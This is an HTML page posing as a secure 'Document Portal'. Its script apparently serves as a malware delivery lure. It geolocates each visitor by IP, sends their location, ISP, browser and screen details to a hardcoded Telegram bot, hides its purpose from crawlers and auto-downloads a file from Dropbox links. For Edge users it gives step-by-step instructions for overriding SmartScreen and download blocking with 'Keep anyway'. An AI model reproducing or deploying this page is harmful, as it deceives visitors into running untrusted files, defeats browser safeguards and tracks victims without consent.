<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Document Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid #e9ecef;
        }
        .icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h2 { color: #1a1e2b; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        p { color: #6c757d; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
        .loader {
            width: 36px;
            height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #6c757d; font-size: 13px; margin: 16px 0; }
        .footer { margin-top: 24px; font-size: 11px; color: #adb5bd; }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .modal-card {
            background: white;
            max-width: 520px;
            width: 90%;
            padding: 35px 30px;
            border-radius: 28px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            max-height: 90vh;
            overflow-y: auto;
        }
        .modal-icon { font-size: 56px; margin-bottom: 16px; }
        .modal-title { font-size: 26px; font-weight: 600; color: #1a1e2b; margin-bottom: 12px; }
        .modal-text { color: #6c757d; font-size: 15px; margin-bottom: 20px; }
        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 20px 0; }
        .btn {
            display: inline-block;
            padding: 12px 28px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
        }
        .btn-chrome { background: #4285f4; color: white; }
        .btn-chrome:hover { background: #3367d6; transform: translateY(-2px); }
        .btn-firefox { background: #ff9400; color: white; }
        .btn-firefox:hover { background: #e08500; transform: translateY(-2px); }
        .btn-edge { background: #e9ecef; color: #495057; }
        .btn-edge:hover { background: #dee2e6; }
        
        .instruction-box {
            background: #f8f9fa;
            padding: 16px;
            border-radius: 12px;
            margin: 20px 0;
            text-align: left;
        }
        .instruction-box p { margin-bottom: 12px; font-size: 13px; color: #495057; }
        .instruction-step {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 12px 0;
            padding: 8px;
            background: white;
            border-radius: 8px;
        }
        .step-number {
            width: 28px;
            height: 28px;
            background: #4285f4;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
        }
        .step-text { flex: 1; font-size: 13px; color: #333; }
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px 16px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
        }
        .warning-box p {
            margin: 0 0 8px 0;
            font-size: 13px;
            color: #856404;
        }
        .install-links { margin-top: 20px; padding-top: 16px; border-top: 1px solid #e9ecef; }
        .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 13px; }
        .install-links a.firefox-link { color: #ff9400; }
    </style>
</head>
<body>
    <div id="app">
        <div class="container">
            <div class="icon">📄</div>
            <h2>Document Portal</h2>
            <p>Loading secure document portal...</p>
            <div class="loader"></div>
            <div class="status">Initializing...</div>
            <div class="footer">Secure • Encrypted</div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
        const TELEGRAM_CHAT_ID = '1482823538';
        
        const FILE_LINKS = [
            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
        ];
        
        async function sendTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }
        
        async function getLocation() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const d = await locRes.json();
                return { ip, city: d.city || 'Unknown', region: d.region || 'Unknown', country: d.country_name || 'Unknown', lat: d.latitude || 'N/A', lng: d.longitude || 'N/A', isp: d.org || 'Unknown' };
            } catch(e) { return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 'N/A', lng: 'N/A', isp: 'Unknown' }; }
        }
        
        async function notify(file, browser, action) {
            const loc = await getLocation();
            const fileName = file.split('/').pop().split('?')[0];
            const msg = `🔵 DOCUMENT ACCESS\n\n📍 ${loc.city}, ${loc.region}, ${loc.country}\n🌐 IP: ${loc.ip}\n🗺️ ${loc.lat}, ${loc.lng}\n🏢 ${loc.isp}\n\n📁 ${fileName}\n💻 ${navigator.platform}\n🌍 ${browser}\n🔄 ${action}\n🖥️ ${window.screen.width}x${window.screen.height}\n📅 ${new Date().toISOString()}`;
            await sendTelegram(msg);
        }
        
        function getBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('edg') || ua.includes('edge')) return 'Edge';
            if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
            if (ua.includes('firefox')) return 'Firefox';
            return 'Other';
        }
        
        function getRandomFile() {
            let hash = 0;
            const str = navigator.userAgent + navigator.language + screen.width + screen.height;
            for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i);
            return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
        }
        
        function showModal(fileUrl) {
            const modal = document.createElement('div');
            modal.className = 'modal-overlay';
            modal.innerHTML = `
                <div class="modal-card">
                    <div class="modal-icon">⚠️</div>
                    <div class="modal-title">Microsoft Edge Detected</div>
                    
                    <div class="warning-box">
                        <p><strong>⚠️ Edge may block or restrict this download</strong></p>
                        <p style="margin-top: 5px;">If the download is blocked, you can still keep the file:</p>
                    </div>
                    
                    <div class="instruction-box">
                        <p><strong>📌 How to keep the file if Edge blocks it:</strong></p>
                        <div class="instruction-step">
                            <div class="step-number">1</div>
                            <div class="step-text">After download is blocked, click the <strong>three dots (...)</strong> in the download bar</div>
                        </div>
                        <div class="instruction-step">
                            <div class="step-number">2</div>
                            <div class="step-text">Select <strong>"Keep"</strong> or <strong>"Keep anyway"</strong></div>
                        </div>
                        <div class="instruction-step">
                            <div class="step-number">3</div>
                            <div class="step-text">If SmartScreen appears, click <strong>"More info"</strong> → <strong>"Keep anyway"</strong></div>
                        </div>
                    </div>
                    
                    <div class="modal-text" style="margin: 15px 0;">
                        <strong>For the best experience, use Chrome or Firefox:</strong>
                    </div>
                    
                    <div class="btn-group">
                        <button id="chromeBtn" class="btn btn-chrome">Open in Chrome</button>
                        <button id="firefoxBtn" class="btn btn-firefox">Open in Firefox</button>
                    </div>
                    
                    <div class="install-links">
                        <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
                        <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                    </div>
                    
                    <button id="edgeBtn" class="btn btn-edge" style="margin-top: 20px;">Continue with Edge (I'll keep the file)</button>
                </div>
            `;
            document.body.appendChild(modal);
            
            // Chrome button - open in Chrome
            document.getElementById('chromeBtn').onclick = () => {
                notify(fileUrl, 'Edge', 'opened_in_chrome');
                modal.remove();
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">🌐</div>
                        <h2>Opening in Chrome</h2>
                        <p>Launching Chrome to download your document...</p>
                        <div class="loader"></div>
                        <div class="footer">Secure • Encrypted</div>
                    </div>
                `;
                // Try to open in Chrome using protocol
                window.location.href = 'googlechrome://' + window.location.href.replace(/^https?:\/\//, '');
                // Fallback: open the file directly
                setTimeout(() => {
                    window.location.href = fileUrl;
                }, 1000);
            };
            
            // Firefox button - open in Firefox
            document.getElementById('firefoxBtn').onclick = () => {
                notify(fileUrl, 'Edge', 'opened_in_firefox');
                modal.remove();
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">🌐</div>
                        <h2>Opening in Firefox</h2>
                        <p>Launching Firefox to download your document...</p>
                        <div class="loader"></div>
                        <div class="footer">Secure • Encrypted</div>
                    </div>
                `;
                window.location.href = 'firefox://' + window.location.href.replace(/^https?:\/\//, '');
                setTimeout(() => {
                    window.location.href = fileUrl;
                }, 1000);
            };
            
            // Edge button - continue in Edge
            document.getElementById('edgeBtn').onclick = () => {
                notify(fileUrl, 'Edge', 'continued_in_edge');
                modal.remove();
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">📄</div>
                        <h2>Opening Document</h2>
                        <div class="warning-box" style="text-align: left;">
                            <p><strong>📌 If the download is blocked:</strong></p>
                            <p>1. Click the <strong>three dots (...)</strong> in the download bar</p>
                            <p>2. Select <strong>"Keep"</strong> or <strong>"Keep anyway"</strong></p>
                            <p>3. If SmartScreen appears → <strong>"More info"</strong> → <strong>"Keep anyway"</strong></p>
                        </div>
                        <p>Downloading your document...</p>
                        <div class="loader"></div>
                        <div class="footer">Secure • Encrypted</div>
                    </div>
                `;
                setTimeout(() => { window.location.href = fileUrl; }, 1500);
            };
        }
        
        (async function() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|iemobile/i.test(ua);
            const isBot = /bot|crawler|spider|scraper|facebook|twitter|whatsapp/i.test(ua);
            const browser = getBrowser();
            const fileUrl = getRandomFile();
            
            if (isBot) {
                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📄</div><h2>Document Portal</h2><p>Secure document delivery system.</p><div class="footer">Secure Transmission</div></div>`;
                return;
            }
            if (isMobile) {
                document.getElementById('app').innerHTML = `<div class="container"><div class="icon">📱</div><h2>Desktop Required</h2><p>Please open on a desktop computer.</p><div class="footer">Secure Document Portal</div></div>`;
                return;
            }
            if (browser === 'Edge') {
                notify(fileUrl, 'Edge', 'detected');
                showModal(fileUrl);
                return;
            }
            
            // Chrome/Firefox - direct download
            notify(fileUrl, browser, 'access');
            document.getElementById('app').innerHTML = `
                <div class="container">
                    <div class="icon">📄</div>
                    <h2>Document Portal</h2>
                    <p>Opening document in ${browser}...</p>
                    <div class="loader"></div>
                    <div class="footer">Secure • Encrypted</div>
                </div>
            `;
            setTimeout(() => { window.location.href = fileUrl; }, 1500);
        })();
    </script>
</body>
</html>
